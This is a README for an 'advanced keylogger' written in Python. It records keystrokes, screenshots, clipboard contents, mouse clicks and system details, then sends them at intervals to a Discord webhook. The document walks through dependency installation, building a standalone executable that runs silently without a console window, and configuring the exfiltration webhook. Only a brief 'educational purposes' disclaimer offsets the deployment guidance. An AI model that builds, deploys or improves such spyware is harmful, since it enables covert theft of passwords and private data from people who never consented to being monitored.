# Advanced Keylogger with Webhook Reporting

A comprehensive keylogger that captures keystrokes, screenshots, clipboard contents, mouse clicks, and system information, sending reports to a webhook URL at specified intervals.

## Features

- Keystroke logging with special key detection
- System information gathering (OS, hostname, IP, hardware details)
- Screenshot capture at regular intervals
- Clipboard monitoring
- Mouse click tracking
- Automatic report generation and submission
- Discord-compatible webhook formatting with embeds
- Local log file storage in JSON format

## Requirements

- Python 3.6+
- pynput
- requests
- pyperclip
- Pillow (PIL)
- pyinstaller (for building executable)

## Installation

### Option 1: Easy Installation (Recommended)

If you encounter any installation issues, use this simplified method:

1. Run the easy installation script:
   ```
   easy_install.bat
   ```

2. Follow the prompts to:
   - Install pre-compiled dependencies
   - Configure your webhook URL

3. Run the keylogger directly with Python:
   ```
   python keylogger.py
   ```

### Option 2: Standard Installation with Executable Build

1. Run the build script:
   ```
   build.bat
   ```

2. Follow the prompts to:
   - Install dependencies
   - Configure your webhook URL
   - Build the standalone executable

3. The executable will be created in the `dist` folder

### Option 3: Manual Installation

1. Install the required dependencies:
   ```
   pip install --upgrade pip wheel setuptools
   pip install --prefer-binary pynput==1.7.6 requests==2.28.1 pyperclip==1.8.2 Pillow==9.3.0
   ```

2. Configure your webhook URL in `keylogger.py`

3. Run the keylogger:
   ```
   python keylogger.py
   ```

## Troubleshooting

### Common Installation Issues

- **Pillow/PIL build errors**: Try installing pre-built wheels using `--prefer-binary` flag or run `easy_install.bat`
- **Missing Visual C++ components**: Some packages require Microsoft Visual C++ Build Tools. The updated build script attempts to install this automatically, or you can download from Microsoft's website.
- **PyInstaller errors**: If the executable build fails with `--noconsole` option, try building with just `--onefile` flag, which will show a console window but is more likely to work.

### Running without Building an Executable

If you're having trouble building the executable, you can run the keylogger directly with Python:
```
python keylogger.py
```

## Configuration Options

You can customize the keylogger by modifying these variables in `keylogger.py`:

```python
# Configuration options
REPORT_INTERVAL = 60  # seconds
TAKE_SCREENSHOTS = True
MONITOR_CLIPBOARD = True
LOG_CLICKS = True
```

## Webhook Setup

The keylogger is configured to send data to a Discord webhook by default, but you can use any webhook service that accepts POST requests with JSON payloads.

For Discord webhooks:
1. Go to your Discord server
2. Edit a channel
3. Select "Integrations" > "Webhooks"
4. Create a new webhook and copy the URL

## Generated Files

- `logs/`: Directory containing:
  - Screenshot images (`screenshot_*.png`)
  - JSON log files with detailed information (`log_*.json`)

## Running as an Executable

After building with `build.bat`, the keylogger will:
1. Run silently in the background (no console window)
2. Start automatically capturing data
3. Send reports to your configured webhook
4. Create local log files in a `logs` directory next to the executable

## Legal Disclaimer

This tool is provided for educational purposes only. Using a keylogger without explicit permission from the owner of the device is illegal and unethical. Always ensure you have proper authorization before deploying this tool. 